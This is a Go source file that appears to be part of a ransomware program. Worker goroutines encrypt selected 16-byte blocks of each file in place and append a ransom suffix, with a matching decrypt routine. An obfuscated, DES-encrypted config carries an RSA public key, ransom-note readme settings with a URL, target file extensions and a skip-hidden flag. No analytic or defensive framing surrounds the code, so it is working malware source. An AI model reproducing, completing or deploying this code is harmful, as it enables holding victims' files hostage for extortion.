package main

import (
	"crypto/cipher"
	"crypto/des"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"crypto/rsa"
	"math/big"
	"strconv"
	"math/rand"
)

func encrypt(filename string, cip cipher.Block) error {

	if len(filename) >= 1+len(settings.Filesuffix) && filename[len(filename)-len(settings.Filesuffix):] == settings.Filesuffix {
		return nil
	}

	f, err := os.OpenFile(filename, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	fstat, _ := f.Stat()
	size := fstat.Size()

	buf, out := make([]byte, 16), make([]byte, 16)
	step := 0
	for offset := jumpHead; size-offset > 16 && offset < encSize; offset += 16 {
		if step < jumpPer {
			step += 1
		} else {
			step = 0
			continue
		}
		f.ReadAt(buf, offset)
		cip.Encrypt(out, buf)
		f.WriteAt(out, offset)
	}

	f.Close()
	os.Rename(filename, filename+settings.Filesuffix)
	return nil
}

func decrypt(filename string, cip cipher.Block) error {

	if len(filename) < 1+len(settings.Filesuffix) || filename[len(filename)-len(settings.Filesuffix):] != settings.Filesuffix {
		return nil
	}
	f, err := os.OpenFile(filename, os.O_RDWR, 0)
	fmt.Println(filename)
	if err != nil {
		return err
	}
	fstat, _ := f.Stat()
	size := fstat.Size()

	buf, out := make([]byte, 16), make([]byte, 16)
	step := 0
	for offset := jumpHead; size-offset > 16 && offset < encSize; offset += 16 {
		if step < jumpPer {
			step += 1
		} else {
			step = 0
			continue
		}
		f.ReadAt(buf, offset)
		cip.Decrypt(out, buf)
		f.WriteAt(out, offset)
	}
	f.Close()
	os.Rename(filename, filename[0:len(filename)-len(settings.Filesuffix)])
	return nil
}

func genHandler(cip cipher.Block, ListChan chan string, ExitChan chan bool) func() {
	var h = encrypt
	switch method {
	case 'e':
		h = encrypt
	case 'd':
		h = decrypt
	}
	rfunc := func() {
		for filename := range ListChan {
			h(filename, cip)
			ExitChan <- true
		}
	}
	return rfunc
}

//func doHandler(cip cipher.Block, ListChan chan string, ExitChan chan bool) {
//	for filename := range ListChan {
//		switch method {
//		case 'e':
//			encrypt(filename, cip)
//		case 'd':
//			decrypt(filename, cip)
//		}
//	}
//	ExitChan <- true
//}

func startHandler(cip cipher.Block, list chan string) {
	ExitChan := make(chan bool, procNum)
	hFunc := genHandler(cip, list, ExitChan)
	for i := 0; i < procNum; i++ {
		go hFunc()
	}
	for i := 0; i < procNum; i++ {
		<-ExitChan
	}
}

type Config struct {
	//加密设置
	pubKey  rsa.PublicKey
	PubKeyN string
	PubKeyE int

	Filesuffix   string
	KeyFilename  string
	DkeyFilename string

	//readme设置
	Readme         string
	ReadmeFilename string

	ReadmeUrl         string
	ReadmeNetFilename string

	EncSuffix     string
	EncSuffixList []string

	SkipHidden bool
}

func (self *Config) init(EncData string) {
	data, _ := base64.StdEncoding.DecodeString(EncData)
	cip, err := des.NewCipher([]byte(configPw))
	if err != nil {
		os.Exit(213)
	}

	for offset := 0; len(data)-offset > 8; offset += 8 {
		cip.Decrypt(data[offset:offset+8], data[offset:offset+8])
	}

	json.Unmarshal(data, self)

	nList := strings.Split(self.PubKeyN, "/")
	N := make([]byte, len(nList))
	for c, i := range nList {
		tmp, _ := strconv.Atoi(i)
		N[c] = byte(tmp)
	}

	self.pubKey = rsa.PublicKey{N: new(big.Int).SetBytes(N), E: self.PubKeyE}
	self.EncSuffixList = strings.Split(self.EncSuffix, "|")
}

func reList(theList []string, count int) []string {
	length := len(theList)
	tmpList := make([]string, length)
	slNum := rand.Int() % len(theList)
	copy(tmpList[0:length-slNum], theList[slNum:])
	copy(tmpList[length-slNum:], theList[0:slNum])
	if count > 1 {
		return reList(tmpList, count-1)
	}
	return tmpList
}
